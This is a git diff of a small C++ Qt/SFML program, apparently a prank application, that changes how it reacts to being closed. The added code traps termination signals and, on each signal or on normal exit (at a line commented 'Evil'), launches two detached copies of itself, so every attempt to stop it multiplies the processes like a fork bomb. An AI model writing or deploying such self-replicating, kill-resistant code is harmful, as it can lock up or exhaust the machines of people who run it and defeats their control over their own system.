@@ -6,6 +6,7 @@
 #include <QtWidgets/QBoxLayout>
 #include <QtGui/QPixmap>
 #include <QtGui/QScreen>
+#include <QtCore/QProcess>
 
 // SFML
 #include <SFML/Audio/Music.hpp>
@@ -60,33 +61,26 @@ static void button_response() {
   QApplication::quit();
 }
 
+void spawn_two_more() {
 
-void die_and_spawn() {
+  // TODO: Check to see if executable exists
 
-#ifdef __unix__
-  char *args[] = {exe_name, NULL};
-  fork();
-  execv(exe_name, args);
-#endif
-
-#ifdef WIN32
-  //TODO
-#endif
-  return;
+  QProcess::startDetached(exe_name);
+  QProcess::startDetached(exe_name);
 }
 
-void die_wrapper(int i) {
-  die_and_spawn();
+void spawn_wrapper(int i) {
+  spawn_two_more();
 }
 
 void trap_setup() {
 
 #ifdef __unix__
-  signal(SIGTERM, die_wrapper);
-  signal(SIGINT, die_wrapper);
-  signal(SIGQUIT, die_wrapper);
-  signal(SIGKILL, die_wrapper);
-  signal(SIGHUP, die_wrapper);
+  signal(SIGTERM, spawn_wrapper);
+  signal(SIGINT, spawn_wrapper);
+  signal(SIGQUIT, spawn_wrapper);
+  signal(SIGKILL, spawn_wrapper);
+  signal(SIGHUP, spawn_wrapper);
 #endif
 
 #ifdef WIN32
@@ -165,7 +159,7 @@ int main(int argc, char* argv[])  {
   app.exec();
 
   // Evil
-  die_and_spawn();
+  spawn_two_more();
 
   return 0;
 }
